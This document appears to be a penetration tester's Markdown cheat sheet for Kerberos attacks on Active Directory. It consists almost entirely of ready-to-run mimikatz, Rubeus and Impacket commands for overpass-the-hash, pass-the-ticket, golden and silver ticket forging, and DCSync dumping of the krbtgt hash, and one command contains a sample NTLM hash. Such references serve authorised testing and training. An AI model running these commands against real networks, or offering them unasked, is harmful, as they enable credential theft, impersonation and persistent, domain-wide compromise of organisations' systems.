#ad #kerberos #golden-ticket #silver-ticket #pass-the-ticket

# Kerberos Ticket Attacks

Golden/silver tickets, pass-the-ticket, overpass-the-hash. Related: [kerberos-delegation](kerberos-delegation.md) · [kerberoasting](kerberoasting.md) · [dacl-attacks](dacl-attacks.md) · [trust-attacks](trust-attacks.md)

## Contents
- [Overpass-the-Hash](#overpass-the-hash)
- [Ticket Handling (Rubeus)](#ticket-handling-rubeus)
- [Golden Ticket](#golden-ticket)
- [Silver Ticket](#silver-ticket)
- [DCSync (dump krbtgt / any account)](#dcsync-dump-krbtgt--any-account)

## Golden vs. Silver Ticket

| | Golden Ticket | Silver Ticket |
|---|---|---|
| Forged from | `krbtgt` account's NT hash | Target *service* account's NT hash |
| Grants access to | Any service in the domain | Only the service(s) tied to that account |
| Requires contact with DC? | No (self-contained TGT) | No, but the targeted service will still validate the PAC in some configs |
| Mimikatz | `kerberos::golden ... /ptt` | Same command + `/target` + `/service` |
| Impacket | `ticketer.py -nthash <krbtgt hash> ...` | `ticketer.py -nthash <service hash> -spn <SPN> ...` |
| Needs | Domain SID, krbtgt hash | Domain SID, service account hash, target SPN |

## Overpass-the-Hash
```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:user-dev$ /domain:inlanefreight.local /ntlm:58867088B44350772FEBDB1E3DAD7640 /run:powershell.exe" exit
```
Overpass-the-Hash with Mimikatz.

## Ticket Handling (Rubeus)
```cmd
Rubeus.exe asktgs /ticket:<b64 ticket> /service:<SPN> /ptt
```
Request a TGS using a TGT and inject it.

```cmd
Rubeus.exe renew /ticket:<b64 ticket> /ptt
```
Renew a TGT and pass it in memory.

```cmd
Rubeus.exe dump /luid:0x89275d /service:krbtgt
```
Dump a TGT from memory.

```cmd
Rubeus.exe ptt /ticket:<BASE64>
```
Pass-the-ticket (inject a ticket into the current session).

```cmd
Rubeus.exe createnetonly /program:powershell.exe /show
```
Create a sacrificial logon session.

```cmd
klist
```
Verify tickets in memory.

## Golden Ticket
```cmd
mimikatz # kerberos::golden /domain:<domain> /user:<user> /sid:<Domain SID> /rc4:<krbtgt NT hash> /ptt
```
Forge a golden ticket (Windows, Mimikatz).

```bash
ticketer.py -nthash <krbtgt NT hash> -domain-sid <Domain SID> -domain <domain> <user>
```
Forge a golden ticket (Linux, Impacket).

> [!CAUTION]
> A golden ticket is minted from the `krbtgt` hash and is valid domain-wide until that hash is rotated (twice, since the previous password stays valid) — this is a full, persistent domain-compromise backdoor, not a one-off credential.

## Silver Ticket
```cmd
mimikatz # kerberos::golden /domain:inlanefreight.local /user:<user> /sid:<Domain SID> /rc4:<Service account NT hash> /target:<target> /service:<service> /ptt
```
Forge a silver ticket (Mimikatz; golden cmd + /target + /service).

```bash
ticketer.py -nthash <Service account NT hash> -domain-sid <Domain SID> -domain <domain> -spn <SPN> <User>
```
Forge a silver ticket (Linux, Impacket).

## DCSync (dump krbtgt / any account)
```cmd
.\mimikatz.exe "lsadump::dcsync /domain:<DOMAIN> /kdc:<DC_HOST> /user:<USER>" exit
```
DCSync a user's hash (requires replication rights). See [dacl-attacks](dacl-attacks.md).

```bash
secretsdump.py <DOMAIN>/Administrator:'<pass>'@<DC_IP> -just-dc-user <DOMAIN>/krbtgt
```
DCSync the krbtgt hash (Impacket).

```bash
lookupsid.py '<DOMAIN>/user'@<DC_IP> -hashes :<NT Hash>
```
Obtain the domain SID (needed for ticket forging).
